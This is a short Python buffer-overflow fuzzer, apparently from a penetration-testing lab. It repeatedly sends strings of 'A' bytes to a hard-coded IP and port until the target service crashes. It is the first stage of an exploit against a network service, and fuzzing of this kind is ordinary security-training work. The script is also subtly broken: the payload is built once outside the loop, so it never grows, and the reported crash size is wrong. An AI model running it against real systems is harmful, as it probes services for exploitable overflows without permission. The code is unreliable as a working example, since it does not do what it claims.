import socket, sys, time


ip = '10.0.2.57'	# Change this
port = 1337		# Change this

prefix = b''
buffer = b'A' * 100

payload = prefix + buffer 


while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((ip, port))
            #s.recv(1024)
            print('Fuzzing with {} bytes'.format(len(payload)))
            s.send(payload)
            s.recv(1024)
    except:
        print('Fuzzing crashed at {}'.format(len(payload)))
        sys.exit(0)
    buffer += b'A' * 100
    time.sleep(1)
